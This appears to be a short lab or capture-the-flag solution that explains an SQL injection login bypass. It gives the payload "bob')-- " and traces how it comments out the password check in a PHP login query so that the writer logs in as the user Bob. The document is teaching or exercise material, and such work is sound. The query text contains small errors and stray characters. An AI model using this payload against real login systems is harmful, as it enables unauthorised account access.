login = "bob')-- "
password "-"

#Explanation
The server will let us login whenever the sql_request returns true.
The sql request is "SELECT ID, name, locale, lastlogin, gender,FROM USERS_TABLE 
WHERE (name = '$user' OR email = '$user') AND pass = '$pass'"
Therefore, if we can make that return TRUE we can login.
The php code will insert exactly what we provide into $user and $pass.
Since we are requested to log in as Bob:
	1. Check if bob exists in database by using our admin account.
	2. Just login using his name, NOT his password. Using "bob')-- " which will create this sql rrequest:
	"SELECT ID, name, locale, lastlogin, gender,FROM USERS_TABLE
  6 WHERE (name = 'bob')-- ' OR email = 'bob')-- ') AND pass = ''"
	3. The '-- ' will comment everything after that in the sql request
	4.The database will receive this request then:
	"SELECT ID, name, locale, lastlogin, gender,FROM USERS_TABLE
  6 WHERE (name = 'bob')"
  	5.Since it only looks for matches of 'bob' and doesnt care about the password,
		it returns TRUE and voil√° we are logged in as bob.
